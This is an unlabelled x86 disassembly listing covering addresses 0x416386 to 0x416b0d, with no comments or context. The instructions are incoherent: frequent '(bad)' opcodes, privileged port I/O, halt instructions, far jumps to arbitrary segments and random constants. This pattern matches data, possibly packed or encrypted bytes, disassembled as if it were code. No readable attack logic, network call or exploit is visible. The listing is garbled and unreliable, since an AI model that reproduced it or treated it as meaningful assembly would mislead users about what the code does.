  416386:	out    0x22,al
  416388:	(bad)  
  416389:	je     0x416349
  41638b:	dec    bp
  41638d:	sbb    DWORD PTR [eax-0x25],eax
  416390:	sub    BYTE PTR [edi],0x60
  416393:	jmp    0x42246df4
  416398:	imul   ecx,ebp,0xc212f86e
  41639e:	mov    ecx,0x40a6369d
  4163a3:	inc    ecx
  4163a4:	into   
  4163a5:	mov    ebx,0x2dd5a5af
  4163aa:	outs   dx,BYTE PTR ds:[esi]
  4163ab:	jnp    0x4163b0
  4163ad:	xor    edx,esi
  4163af:	ds fwait
  4163b1:	jae    0x416358
  4163b3:	pop    edx
  4163b4:	fwait
  4163b5:	xchg   esp,eax
  4163b6:	or     al,0x17
  4163b8:	jns    0x4163a0
  4163ba:	daa    
  4163bb:	loopne 0x416377
  4163bd:	push   esp
  4163be:	hlt    
  4163bf:	push   ecx
  4163c0:	inc    esp
  4163c1:	test   al,0xbf
  4163c3:	pop    esp
  4163c4:	add    eax,0xe06c48f7
  4163c9:	xchg   ecx,eax
  4163ca:	mov    cl,0xc1
  4163cc:	data16 mov al,ds:0xbc9473cc
  4163d2:	dec    ebx
  4163d3:	hlt    
  4163d4:	std    
  4163d5:	ds xor eax,0x2d366f57
  4163db:	adc    cl,al
  4163dd:	test   al,0x97
  4163df:	push   ebp
  4163e0:	fucomi st,st(1)
  4163e2:	push   0x8480a210
  4163e7:	cmovg  esi,esp
  4163ea:	outs   dx,BYTE PTR ds:[esi]
  4163eb:	in     eax,dx
  4163ec:	xchg   edx,eax
  4163ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ee:	mov    al,ds:0x9a2fced0
  4163f3:	xchg   esi,eax
  4163f4:	or     DWORD PTR [edi+0x6144a216],eax
  4163fa:	fst    QWORD PTR [esp+edi*4-0x6c42526b]
  416401:	shl    DWORD PTR [ecx-0x69e41dcf],cl
  416407:	arpl   WORD PTR [edi],cx
  416409:	push   esi
  41640a:	mov    dl,0x28
  41640c:	push   edi
  41640d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41640e:	xlat   BYTE PTR ds:[ebx]
  41640f:	pop    esi
  416410:	repnz mov dh,0xaa
  416413:	inc    ecx
  416414:	not    DWORD PTR [ecx-0x6e710aa7]
  41641a:	push   ecx
  41641b:	pop    es
  41641c:	adc    DWORD PTR ds:0xd876e6c,ebp
  416422:	stos   BYTE PTR es:[edi],al
  416423:	or     al,0x74
  416425:	inc    eax
  416426:	dec    edx
  416427:	xchg   ebx,eax
  416428:	or     ebp,esp
  41642a:	pusha  
  41642b:	sbb    eax,0x4f0dc56f
  416430:	inc    ecx
  416431:	sub    esp,DWORD PTR [ecx-0x65257325]
  416437:	pushw  ss
  416439:	dec    ecx
  41643a:	dec    edx
  41643b:	es mov edx,0x5fdbeef3
  416441:	add    edx,DWORD PTR [edx]
  416443:	data16 fcom DWORD PTR [eax-0x2a6e60c8]
  41644a:	cdq    
  41644b:	inc    edi
  41644c:	and    al,0xbf
  41644e:	sub    DWORD PTR [edx],esi
  416450:	retf   0xd1ce
  416453:	out    dx,al
  416454:	xor    al,0x7b
  416456:	and    edi,eax
  416458:	(bad)  [ecx-0x2b92e5b9]
  41645e:	or     ah,0xe6
  416461:	mov    cl,0xaf
  416463:	test   cl,bl
  416465:	cmc    
  416466:	xor    cl,BYTE PTR [ebx]
  416468:	mov    ds:0xc92d16f2,eax
  41646d:	ret    0xda70
  416470:	bound  ebx,QWORD PTR [edi-0x23]
  416473:	ret    0x49c7
  416476:	lods   al,BYTE PTR ds:[esi]
  416477:	repz jl 0x41642f
  41647a:	fld    DWORD PTR [ebx+0x7d1c4d5a]
  416480:	scas   al,BYTE PTR es:[edi]
  416481:	pop    esi
  416482:	cmp    bl,BYTE PTR [edx+esi*4+0x683bffbc]
  416489:	inc    edi
  41648a:	(bad)  
  41648b:	aad    0x34
  41648d:	pop    ss
  41648e:	fsubr  QWORD PTR [eax+0x60f1914]
  416494:	push   edx
  416495:	and    ebx,DWORD PTR [ebp+0x34]
  416498:	dec    esp
  416499:	adc    eax,0x896401bd
  41649e:	les    edx,FWORD PTR [esi]
  4164a0:	pop    edx
  4164a1:	leave  
  4164a2:	aad    0x31
  4164a4:	out    dx,al
  4164a5:	cmp    al,dl
  4164a7:	cmp    eax,0xa0e68f0f
  4164ac:	fistp  WORD PTR [ebp+0x2d]
  4164af:	jmp    0xc28d82c
  4164b4:	xor    DWORD PTR [eax-0x4c8f67cb],esi
  4164ba:	daa    
  4164bb:	adc    edi,DWORD PTR [ebx-0x67]
  4164be:	xchg   esp,esp
  4164c0:	jmp    0x41653f
  4164c2:	pop    ebp
  4164c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164c4:	xchg   edi,eax
  4164c5:	call   0xa0445ffe
  4164ca:	push   edi
  4164cb:	sub    ebx,esi
  4164cd:	sbb    DWORD PTR [ebx-0x253f7acb],0x13
  4164d4:	dec    esp
  4164d5:	pop    ss
  4164d6:	test   BYTE PTR fs:[ebx-0x60f387b6],bh
  4164dd:	mov    ds:0x2bb07eb1,eax
  4164e2:	out    0xf5,al
  4164e4:	sbb    DWORD PTR [eax],ecx
  4164e6:	cwde   
  4164e7:	lahf   
  4164e8:	imul   edx,DWORD PTR es:[edi+0x14],0xca77c42f
  4164f0:	sbb    al,0x7e
  4164f2:	fwait
  4164f3:	mov    ebx,0x76dea0a5
  4164f8:	or     bl,BYTE PTR [ecx]
  4164fa:	into   
  4164fb:	in     al,0x3f
  4164fd:	lods   al,BYTE PTR ds:[esi]
  4164fe:	sub    esi,DWORD PTR [ebp-0x776e0111]
  416504:	mov    DWORD PTR [ecx],eax
  416506:	loope  0x416573
  416508:	dec    esp
  416509:	(bad)  
  41650b:	xor    DWORD PTR [ebx+0x40c6d3a0],edx
  416511:	inc    ebx
  416512:	jmp    0xdc707eed
  416517:	jb     0x41655a
  416519:	int    0xcd
  41651b:	dec    ebp
  41651c:	fcomp  DWORD PTR [esi+0x1e]
  41651f:	pop    esi
  416520:	inc    ebp
  416521:	cmp    ebp,esp
  416523:	sub    DWORD PTR [ebp+0x7975382d],esp
  416529:	cdq    
  41652a:	jl     0x4164ee
  41652c:	mov    DWORD PTR [ebx],esp
  41652e:	iret   
  41652f:	stc    
  416530:	mov    ds:0xd9a7494d,al
  416535:	pop    ecx
  416536:	adc    DWORD PTR [edx-0x4e],esi
  416539:	dec    edi
  41653a:	jp     0x4165b4
  41653c:	in     al,0x6e
  41653e:	jo     0x4165a1
  416540:	daa    
  416541:	inc    ebp
  416542:	push   es
  416543:	cwde   
  416544:	test   DWORD PTR [edx],eax
  416546:	push   edi
  416547:	mov    ecx,0x7c1a3abd
  41654c:	pop    esp
  41654d:	lods   eax,DWORD PTR ds:[esi]
  41654e:	gs call 0x53ec2056
  416554:	(bad)  
  416555:	and    BYTE PTR [ebp-0x20],bh
  416558:	or     ebp,DWORD PTR [edx]
  41655a:	adc    al,0xc7
  41655c:	test   DWORD PTR [esi],eax
  41655e:	push   esp
  41655f:	lods   al,BYTE PTR ds:[esi]
  416560:	xchg   ebx,eax
  416562:	inc    ebp
  416563:	test   WORD PTR [eax+0x23c3ac49],0xef0e
  41656c:	call   0xdf85:0xe573fefe
  416573:	jmp    0x869e46c7
  416578:	inc    ebp
  416579:	sbb    DWORD PTR [eax-0x56],ebp
  41657c:	imul   ecx,DWORD PTR [esi],0x1ae1b188
  416582:	pop    ds
  416583:	xor    DWORD PTR [esi+0x54915707],ebp
  416589:	sbb    al,0xb7
  41658b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41658c:	xchg   edx,eax
  41658d:	and    BYTE PTR [esi-0x6],0x94
  416591:	ret    0x757b
  416594:	jns    0x416516
  416596:	xor    esp,ebp
  416598:	and    eax,0x69a8f7a7
  41659d:	pop    es
  41659e:	adc    DWORD PTR ds:0x9005b608,eax
  4165a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a5:	call   0xf475:0xc47ccc35
  4165ac:	pop    esi
  4165ad:	cs cmp DWORD PTR fs:[edx-0x4ffb0e11],0xe607be1c
  4165b9:	out    0xb7,eax
  4165bb:	or     cl,bl
  4165bd:	mov    bl,0x44
  4165bf:	add    edi,DWORD PTR [eax+0x1af4a702]
  4165c5:	push   esp
  4165c6:	inc    ebx
  4165c7:	dec    ecx
  4165c8:	scas   eax,DWORD PTR es:[edi]
  4165c9:	(bad)  
  4165cb:	jae    0x4165a1
  4165cd:	ins    BYTE PTR es:[edi],dx
  4165ce:	out    0xcf,al
  4165d0:	sbb    BYTE PTR [ebx+eax*8+0x6cae43d8],ch
  4165d7:	push   ecx
  4165d8:	dec    ebx
  4165d9:	aaa    
  4165da:	rcr    BYTE PTR [edx],cl
  4165dc:	add    bl,0x94
  4165df:	push   0x63b2cce4
  4165e4:	retf   
  4165e5:	leave  
  4165e6:	xlat   BYTE PTR ds:[ebx]
  4165e7:	push   edx
  4165e8:	and    eax,0x38a952ab
  4165ed:	mov    ah,BYTE PTR ds:0xd6f1fd8b
  4165f3:	xchg   esi,eax
  4165f4:	xchg   ecx,eax
  4165f5:	and    esi,ebx
  4165f7:	or     DWORD PTR [ebp+ecx*4+0x5a],edx
  4165fb:	pop    edi
  4165fc:	pop    edi
  4165fd:	ret    0xfce
  416600:	dec    ecx
  416601:	dec    ecx
  416602:	lods   eax,DWORD PTR ds:[esi]
  416603:	and    al,0xc5
  416605:	cmp    DWORD PTR [ecx+0x327e1ead],ebp
  41660b:	ins    BYTE PTR es:[edi],dx
  41660c:	xor    DWORD PTR [esp+ebx*1+0x17],edx
  416610:	mov    DWORD PTR [ecx],ecx
  416612:	outs   dx,DWORD PTR ds:[esi]
  416613:	jle    0x416649
  416615:	push   ebx
  416616:	xor    al,cl
  416618:	(bad)  
  416619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41661a:	(bad)  
  41661b:	out    dx,eax
  41661c:	mov    gs,WORD PTR [edx-0x2f]
  41661f:	or     BYTE PTR [ebp+0xe],cl
  416622:	iret   
  416623:	(bad)  
  416624:	leave  
  416625:	cmp    al,0xaa
  416627:	in     al,0xfe
  416629:	adc    eax,0x570a2c9b
  41662e:	pop    ss
  41662f:	jmp    FWORD PTR [edx+0x4ebe33ba]
  416635:	jbe    0x4166b4
  416637:	and    DWORD PTR [edi+0x38],esp
  41663a:	shl    DWORD PTR [ebp+0x25],1
  41663d:	je     0x4165e1
  41663f:	mov    al,0x8b
  416641:	hlt    
  416642:	rcr    BYTE PTR [ecx+0x3c],0x86
  416646:	test   al,0x5
  416648:	ja     0x4166bc
  41664a:	dec    ebp
  41664b:	mov    esp,0x3789015c
  416650:	ins    DWORD PTR es:[edi],dx
  416651:	dec    edi
  416652:	inc    ebp
  416653:	out    dx,al
  416654:	and    al,0x78
  416656:	add    al,0x9a
  416658:	xlat   BYTE PTR ds:[ebx]
  416659:	std    
  41665a:	fcomp  DWORD PTR [ebp-0x46]
  41665d:	mov    eax,ds:0xf3d821eb
  416662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416663:	(bad)  
  416665:	push   eax
  416666:	cmp    al,0xe0
  416668:	fwait
  416669:	repnz addr16 and al,0xcb
  41666d:	mov    es,edi
  41666f:	push   esi
  416670:	push   0xe5f62e79
  416675:	aam    0xb0
  416677:	sub    esp,0xb6909e7a
  41667d:	xchg   edx,eax
  41667e:	cs or  al,0xd3
  416681:	inc    esi
  416682:	pop    eax
  416683:	inc    ebp
  416684:	sbb    dh,cl
  416686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416687:	push   esi
  416688:	dec    edi
  416689:	cs lahf 
  41668b:	ds inc edi
  41668d:	hlt    
  41668e:	mov    cl,0xd3
  416690:	pop    ebp
  416691:	mov    BYTE PTR [ecx+0x3c],dl
  416694:	push   ebp
  416695:	es jns 0x4166e2
  416698:	adc    DWORD PTR [eax],eax
  41669a:	sub    BYTE PTR [ecx+0x3],dl
  41669d:	or     BYTE PTR [esi-0x63a01a9d],bl
  4166a3:	cmc    
  4166a4:	daa    
  4166a5:	outs   dx,BYTE PTR ds:[esi]
  4166a6:	add    DWORD PTR [ebx-0x7a],edx
  4166a9:	sub    al,0x15
  4166ab:	pop    esp
  4166ac:	inc    edi
  4166ad:	(bad)  
  4166af:	push   ds
  4166b0:	push   cs
  4166b1:	fisub  WORD PTR [ecx+esi*4+0x0]
  4166b5:	scas   eax,DWORD PTR es:[edi]
  4166b6:	ja     0x41668f
  4166b8:	in     al,dx
  4166b9:	fcom   DWORD PTR [edi]
  4166bb:	sub    al,0x7d
  4166bd:	or     dl,al
  4166bf:	das    
  4166c0:	sbb    esp,DWORD PTR [esi-0x35e8f127]
  4166c6:	xchg   BYTE PTR [esi-0x6a],dh
  4166c9:	dec    eax
  4166ca:	jo     0x41670d
  4166cc:	call   ecx
  4166ce:	ror    ebp,cl
  4166d0:	loop   0x41667f
  4166d2:	ins    DWORD PTR es:[edi],dx
  4166d3:	dec    eax
  4166d4:	into   
  4166d5:	cmp    DWORD PTR [edi+0x470447],eax
  4166db:	sbb    al,0x28
  4166dd:	jmp    0x4166cb
  4166df:	aaa    
  4166e0:	pop    ecx
  4166e1:	mov    edi,0x8f679375
  4166e6:	repz sahf 
  4166e8:	inc    ecx
  4166e9:	outs   dx,DWORD PTR ds:[esi]
  4166ea:	inc    ecx
  4166eb:	mov    eax,ds:0xe8e60238
  4166f0:	or     edi,DWORD PTR [ebx+eiz*8-0x23]
  4166f4:	out    dx,eax
  4166f5:	(bad)  
  4166f6:	les    bp,DWORD PTR [ecx]
  4166f9:	add    eax,0xa8eb1c53
  4166fe:	push   ss
  4166ff:	jmp    0x3367:0xdfb2e70d
  416706:	jmp    0xd299:0xd9c29089
  41670d:	push   esp
  41670e:	(bad)  
  41670f:	aad    0xa5
  416711:	jb     0x41672c
  416713:	or     esi,DWORD PTR [edi+0x6eb4333e]
  416719:	mov    ebx,DWORD PTR [esi+0xc]
  41671c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671d:	xor    al,0xf1
  41671f:	dec    eax
  416720:	mov    ch,0xb7
  416722:	aaa    
  416723:	sti    
  416724:	sbb    DWORD PTR [ecx+0x5f],edi
  416727:	xor    al,ah
  416729:	ror    BYTE PTR [edx+0x7a],cl
  41672c:	int    0x6c
  41672e:	iret   
  41672f:	push   0xfffffff9
  416731:	mov    bl,0x9c
  416733:	cmp    eax,0x736c0214
  416738:	xor    eax,0xf6c425b4
  41673d:	aad    0x74
  41673f:	gs jg  0x416723
  416742:	mov    ds:0x757b408d,eax
  416747:	or     eax,DWORD PTR [eax+0x5]
  41674a:	fistp  DWORD PTR [eax+0x7c480ac7]
  416750:	cld    
  416751:	daa    
  416752:	xor    edi,DWORD PTR [edi+0x2e]
  416755:	mov    WORD PTR [ecx],?
  416757:	fdivr  DWORD PTR [ecx-0x562eab1]
  41675d:	add    al,0xba
  41675f:	dec    ecx
  416760:	mov    al,0xd
  416762:	pop    si
  416764:	xor    bh,BYTE PTR [ebp-0xb658601]
  41676a:	mov    ds:0xee9c9c54,eax
  41676f:	ins    BYTE PTR es:[edi],dx
  416770:	addr16 sub al,0x2b
  416773:	std    
  416774:	lea    ebx,[ecx]
  416776:	adc    esi,DWORD PTR [ecx+0x3d468345]
  41677c:	fmul   QWORD PTR [ebx-0x3b25f2e5]
  416782:	sbb    eax,0x48022352
  416788:	xchg   ecx,eax
  416789:	pop    eax
  41678a:	(bad)  
  41678b:	imul   edx,DWORD PTR [ebp+0x2e],0xffffff92
  41678f:	iret   
  416790:	rcl    DWORD PTR [eax],1
  416792:	jae    0x4167bd
  416794:	div    BYTE PTR [ecx-0x1c]
  416797:	jno    0x416753
  416799:	imul   edx,edx,0xa04a2fc1
  41679f:	mov    DWORD PTR [ebx],eax
  4167a1:	cmp    eax,0xef22c620
  4167a6:	pusha  
  4167a7:	xchg   esi,eax
  4167a8:	fcmovnu st,st(7)
  4167aa:	ins    DWORD PTR es:[edi],dx
  4167ab:	rcr    ch,0x77
  4167ae:	sbb    eax,0xe7edf5b8
  4167b3:	mov    eax,DWORD PTR [edi-0x5c]
  4167b6:	mov    al,0x70
  4167b8:	mov    esi,0xe1ccaa97
  4167bd:	lods   al,BYTE PTR ds:[esi]
  4167be:	jae    0x4167c3
  4167c0:	xchg   ecx,eax
  4167c1:	pop    edx
  4167c2:	mov    dl,0x25
  4167c4:	retf   
  4167c5:	sti    
  4167c6:	pusha  
  4167c7:	mov    bh,0x61
  4167c9:	in     al,0x15
  4167cb:	icebp  
  4167cc:	dec    esp
  4167cd:	ds xchg ebp,eax
  4167cf:	iret   
  4167d0:	inc    ebp
  4167d1:	les    edi,FWORD PTR [eax]
  4167d3:	stc    
  4167d4:	leave  
  4167d5:	ficomp DWORD PTR [ecx+0x78]
  4167d8:	(bad)  
  4167d9:	xchg   ebx,eax
  4167da:	xchg   esi,eax
  4167db:	faddp  st(4),st
  4167dd:	fist   DWORD PTR [esi]
  4167df:	retf   0xd14c
  4167e2:	pop    ss
  4167e3:	push   ebp
  4167e4:	fsubr  QWORD PTR [esi]
  4167e6:	lea    ecx,[ecx]
  4167e8:	adc    al,BYTE PTR [ebx]
  4167ea:	mov    BYTE PTR [esp+eax*2-0x21],dh
  4167ee:	clc    
  4167ef:	clc    
  4167f0:	xchg   esp,eax
  4167f1:	es stos DWORD PTR es:[edi],eax
  4167f3:	in     eax,0x88
  4167f5:	sti    
  4167f6:	pop    ebp
  4167f7:	inc    ebp
  4167f8:	ins    DWORD PTR es:[edi],dx
  4167f9:	test   DWORD PTR [ebx-0x37],edi
  4167fc:	fs mov dl,0xfa
  4167ff:	and    DWORD PTR [eax],esi
  416801:	add    ebp,DWORD PTR gs:[esi+0x6762e9c4]
  416808:	xor    eax,0x5feb0685
  41680d:	sub    al,0xe0
  41680f:	dec    eax
  416810:	cld    
  416811:	enter  0x2b0c,0x73
  416815:	or     esp,DWORD PTR [ebp+0x35d68988]
  41681b:	repnz arpl dx,bx
  41681e:	sub    al,0x8
  416820:	push   edi
  416821:	jae    0x41683a
  416823:	adc    eax,0xda6acf9a
  416828:	cmp    BYTE PTR [edi],ch
  41682a:	push   edx
  41682b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41682c:	xchg   DWORD PTR [eax+0x102a1a06],ebx
  416832:	test   BYTE PTR [ecx+eiz*4-0x8],dh
  416836:	ja     0x4167c8
  416838:	loope  0x416813
  41683a:	xor    DWORD PTR [esi],esp
  41683c:	fst    DWORD PTR [ebx]
  41683e:	push   cs
  41683f:	aaa    
  416840:	(bad)  
  416841:	pop    edi
  416842:	repnz scas al,BYTE PTR es:[edi]
  416844:	test   eax,0x41fb1648
  416849:	pop    ebp
  41684a:	arpl   WORD PTR [edi],ax
  41684c:	(bad)  
  41684d:	jns    0x4167df
  41684f:	mov    eax,0xa27e692
  416854:	adc    DWORD PTR [esp+edx*1],edx
  416857:	fsub   QWORD PTR [edx+0x7]
  41685a:	push   esp
  41685b:	(bad)  
  41685c:	sub    al,BYTE PTR [ebx+0xda40c40]
  416862:	jle    0x416819
  416864:	nop
  416865:	int3   
  416866:	fwait
  416867:	lods   eax,DWORD PTR ds:[esi]
  416868:	and    DWORD PTR [edx],edi
  41686a:	ror    ebx,0xd5
  41686d:	inc    DWORD PTR [esi]
  41686f:	(bad)  
  416870:	test   eax,0xc74b90c0
  416876:	add    al,0xdd
  416878:	xchg   ecx,eax
  416879:	rol    DWORD PTR [ecx],1
  41687b:	mov    ebp,0x926f3059
  416880:	lods   eax,DWORD PTR ds:[esi]
  416881:	fbstp  TBYTE PTR [edx+0x5250ed5f]
  416887:	out    0x93,eax
  416889:	add    al,0xb9
  41688b:	cmp    dh,BYTE PTR [esi-0x9ac8749]
  416891:	sbb    al,0x63
  416893:	imul   ebp,DWORD PTR [ebx],0x40b4251e
  416899:	mov    ch,0x8f
  41689b:	mov    eax,DWORD PTR [ebp+0x448ce86a]
  4168a1:	es inc esi
  4168a3:	jg     0x41689f
  4168a5:	jae    0x416918
  4168a7:	jbe    0x416841
  4168a9:	aam    0x6c
  4168ab:	adc    eax,0x47670204
  4168b0:	sbb    DWORD PTR [eax],esp
  4168b2:	scas   eax,DWORD PTR es:[edi]
  4168b3:	cmp    DWORD PTR [esi-0x2d7e8bea],esi
  4168b9:	shr    ebx,0xe6
  4168bc:	or     eax,0xa5033196
  4168c1:	adc    cl,BYTE PTR [edi+edx*1-0x21]
  4168c5:	jmp    0xa243ec4d
  4168ca:	stos   BYTE PTR es:[edi],al
  4168cb:	inc    eax
  4168cc:	inc    esp
  4168cd:	pop    ecx
  4168ce:	aas    
  4168cf:	mov    dl,bh
  4168d1:	mov    dh,0xe1
  4168d3:	nop
  4168d4:	dec    esp
  4168d5:	lods   al,BYTE PTR ds:[esi]
  4168d6:	sbb    edi,esi
  4168d8:	xchg   BYTE PTR [ecx],dl
  4168da:	sub    al,0x4b
  4168dc:	jge    0x4168ff
  4168de:	int3   
  4168df:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168e1:	ret    
  4168e2:	jle    0x4168a4
  4168e4:	int3   
  4168e5:	xchg   edi,eax
  4168e6:	ja     0x4168f9
  4168e8:	mov    dl,0x64
  4168ea:	xchg   BYTE PTR [ecx+esi*2-0x7f],bl
  4168ee:	add    ebx,DWORD PTR [edi]
  4168f0:	mov    ecx,0xd93b7c05
  4168f5:	add    eax,0xe669bd23
  4168fa:	mov    ch,cl
  4168fc:	mov    ecx,DWORD PTR [ecx]
  4168fe:	sub    eax,0x662b3e27
  416903:	sbb    BYTE PTR [edx-0x538a2e8c],ch
  416909:	pop    esi
  41690a:	enter  0xda5,0xb9
  41690e:	fiadd  WORD PTR [ebx-0x851f1ec]
  416914:	cli    
  416915:	push   ebp
  416916:	push   0xffffffed
  416918:	out    dx,eax
  416919:	iret   
  41691a:	xlat   BYTE PTR gs:[ebx]
  41691c:	sub    eax,0xc1b94fee
  416921:	jecxz  0x416974
  416923:	pushf  
  416924:	mov    ah,0xf8
  416926:	in     al,0xa6
  416928:	sbb    DWORD PTR [esp+ecx*1-0xf],esi
  41692c:	adc    al,0x2c
  41692e:	and    DWORD PTR [ecx],eax
  416930:	dec    esi
  416931:	cdq    
  416932:	inc    esi
  416933:	jge    0x4168e8
  416935:	into   
  416936:	les    ebx,FWORD PTR gs:[edi+0x5a]
  41693a:	js     0x416972
  41693c:	pop    ecx
  41693d:	es out dx,al
  41693f:	push   es
  416940:	dec    edi
  416941:	gs aad 0x9b
  416944:	lods   eax,DWORD PTR ds:[esi]
  416945:	sbb    BYTE PTR [ebx],dl
  416947:	aaa    
  416948:	(bad)  
  416949:	adc    DWORD PTR [ebx+0x19],esi
  41694c:	hlt    
  41694d:	push   0x2e
  41694f:	adc    dl,BYTE PTR [edi]
  416951:	mov    BYTE PTR [edx],ah
  416953:	adc    ebp,DWORD PTR [esi+ecx*1+0x4be2c6a]
  41695a:	ins    DWORD PTR es:[edi],dx
  41695b:	adc    eax,0x6a7981
  416960:	cmc    
  416961:	fucomi st,st(4)
  416963:	in     al,dx
  416964:	sbb    al,0x9d
  416966:	stc    
  416967:	test   bl,dl
  416969:	sbb    DWORD PTR [ebp+0x27],edx
  41696c:	loope  0x4169d4
  41696e:	cmp    BYTE PTR ds:0xbaf9a068,dh
  416974:	mov    DWORD PTR [ecx+0x6ce02fa3],esp
  41697a:	popf   
  41697b:	in     al,0xc4
  41697d:	lods   al,BYTE PTR ds:[esi]
  41697e:	xchg   edi,eax
  41697f:	xchg   edi,eax
  416980:	dec    edi
  416981:	jmp    0x9073:0x25e4f216
  416988:	or     DWORD PTR [edx+0x2060c003],ebp
  41698e:	jmp    0x41694a
  416990:	sti    
  416991:	cmp    eax,DWORD PTR [edi]
  416993:	test   DWORD PTR [edi],ebp
  416995:	xor    al,0xbb
  416997:	push   es
  416998:	push   eax
  416999:	popf   
  41699a:	mov    bh,0x9d
  41699c:	dec    ebp
  41699d:	retf   0x66ab
  4169a0:	push   esp
  4169a1:	sbb    al,ah
  4169a3:	jmp    0xc306:0x705a2cda
  4169aa:	mov    ebx,0xaa5193d5
  4169af:	pop    esi
  4169b0:	dec    esp
  4169b1:	sub    edx,DWORD PTR [edi]
  4169b3:	rol    BYTE PTR [edi+0x27d2e2a7],0xe3
  4169ba:	ftst   
  4169bc:	sbb    al,0xe3
  4169be:	sbb    DWORD PTR [ecx],ebp
  4169c0:	lds    edx,FWORD PTR [edi]
  4169c2:	mov    ds:0xfcb102a0,eax
  4169c7:	mov    edx,0xfe4bed7f
  4169cc:	sahf   
  4169cd:	in     al,0x50
  4169cf:	push   esi
  4169d0:	into   
  4169d1:	ror    DWORD PTR [ebx],0xf9
  4169d4:	and    eax,0x34b8d277
  4169d9:	and    al,0xb4
  4169db:	dec    ecx
  4169dc:	scas   eax,DWORD PTR es:[edi]
  4169dd:	div    BYTE PTR [edx-0x78]
  4169e0:	mov    cl,0xa8
  4169e2:	arpl   WORD PTR [esi+0x7f],bp
  4169e5:	cmp    BYTE PTR [ecx+0x763675d5],cl
  4169eb:	repz adc al,0x25
  4169ee:	bound  edx,QWORD PTR [ecx-0x37]
  4169f1:	adc    dh,BYTE PTR [esi+eiz*4+0x61]
  4169f5:	sbb    bh,ah
  4169f7:	ret    
  4169f8:	retf   0x590
  4169fb:	ins    DWORD PTR es:[edi],dx
  4169fc:	je     0x416a40
  4169fe:	ja     0x4169d9
  416a00:	sbb    BYTE PTR [edi],ch
  416a02:	pop    ebx
  416a03:	inc    ebp
  416a05:	jle    0x4169dd
  416a07:	pop    ebp
  416a08:	lods   eax,DWORD PTR ds:[esi]
  416a09:	mov    ch,cl
  416a0b:	mov    eax,ds:0x24e3f803
  416a10:	ins    BYTE PTR es:[edi],dx
  416a11:	sbb    BYTE PTR [ecx],bl
  416a13:	jno    0x416a7c
  416a15:	je     0x416a76
  416a17:	int3   
  416a18:	imul   edi,DWORD PTR [esi+0x3c40cd84],0xf13c6a46
  416a22:	push   ds
  416a23:	xor    BYTE PTR [ebx+0x211978e1],ah
  416a29:	imul   ecx,DWORD PTR [eax+eiz*8],0x3faa4773
  416a30:	sbb    al,BYTE PTR ds:0xb33b5333
  416a36:	xchg   ebp,eax
  416a37:	out    0xcc,eax
  416a39:	xor    DWORD PTR [edx],ebp
  416a3b:	pushf  
  416a3c:	push   eax
  416a3d:	add    eax,0xb0ae9a0f
  416a42:	dec    esi
  416a43:	jp     0x416a3b
  416a45:	cmp    al,0x6b
  416a48:	jno    0x4169cf
  416a4a:	mov    eax,ds:0x33eaf5e9
  416a4f:	ret    0xcd75
  416a52:	stc    
  416a53:	popa   
  416a54:	dec    ecx
  416a55:	cmp    eax,0xd342322d
  416a5a:	inc    edx
  416a5b:	adc    al,0x3c
  416a5d:	cs xchg ecx,eax
  416a5f:	xor    eax,0x16b61f30
  416a64:	outs   dx,BYTE PTR ds:[esi]
  416a65:	xchg   ebp,eax
  416a66:	mov    BYTE PTR [edx-0x3a156ce8],al
  416a6c:	jb     0x416a6b
  416a6e:	in     eax,0x50
  416a70:	imul   eax,edi,0xffffffa1
  416a73:	sbb    dl,dh
  416a75:	(bad)  
  416a76:	jmp    0x5ebd:0x741ea253
  416a7d:	adc    al,0x7c
  416a7f:	leave  
  416a80:	mov    dh,0x61
  416a82:	jno    0x416a9f
  416a84:	cs retf 
  416a86:	mov    esi,0x2060ef49
  416a8b:	sub    BYTE PTR [edx],bl
  416a8d:	sbb    DWORD PTR [eax],ebp
  416a8f:	xchg   edi,eax
  416a90:	fcom   DWORD PTR [edi+ebp*2]
  416a93:	iret   
  416a94:	scas   al,BYTE PTR es:[edi]
  416a95:	shl    BYTE PTR [ebx],1
  416a97:	aam    0x6c
  416a99:	xlat   BYTE PTR ds:[ebx]
  416a9a:	in     eax,dx
  416a9b:	sbb    BYTE PTR [edx-0x6d],bh
  416a9e:	xchg   edx,eax
  416a9f:	xchg   BYTE PTR [edx-0x5d389ab0],ch
  416aa5:	pop    edi
  416aa6:	mov    al,0xe8
  416aa8:	fs jno 0x416a50
  416aab:	fcomi  st,st(6)
  416aad:	mov    dl,0xdd
  416aaf:	popa   
  416ab0:	shl    ebp,0xa3
  416ab3:	out    dx,al
  416ab4:	into   
  416ab5:	cmp    DWORD PTR [esi+eax*1+0x60f1bcba],esp
  416abc:	and    bh,BYTE PTR [ebp+0x65]
  416abf:	fmul   QWORD PTR [edi+0x4a]
  416ac2:	push   cs
  416ac3:	or     dl,bh
  416ac5:	test   DWORD PTR [ecx],edi
  416ac7:	xchg   edi,eax
  416ac8:	sub    al,0x7b
  416aca:	data16 in al,dx
  416acc:	loop   0x416aba
  416ace:	not    BYTE PTR [ebp+0x37d56e94]
  416ad4:	inc    ecx
  416ad5:	add    DWORD PTR [edx+0x237fc4b0],esi
  416adb:	fmulp  st(3),st
  416add:	mov    eax,0x9b5b3f51
  416ae2:	sbb    dh,BYTE PTR [eax]
  416ae4:	scas   eax,DWORD PTR es:[edi]
  416ae5:	rcr    esp,cl
  416ae7:	mov    ds:0xc403b25a,eax
  416aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aed:	dec    edx
  416aee:	lock push es
  416af0:	scas   eax,DWORD PTR es:[edi]
  416af1:	mov    eax,ds:0xc96e5b5f
  416af6:	xlat   BYTE PTR ds:[ebx]
  416af7:	jge    0x416b19
  416af9:	mov    edx,0x579af836
  416afe:	sbb    eax,0x8c28e271
  416b03:	in     al,dx
  416b04:	push   ebx
  416b05:	stos   DWORD PTR es:[edi],eax
  416b06:	push   cs
  416b07:	lds    esp,FWORD PTR [ebx+0x340d1ca9]
  416b0d:	and    ch,cl
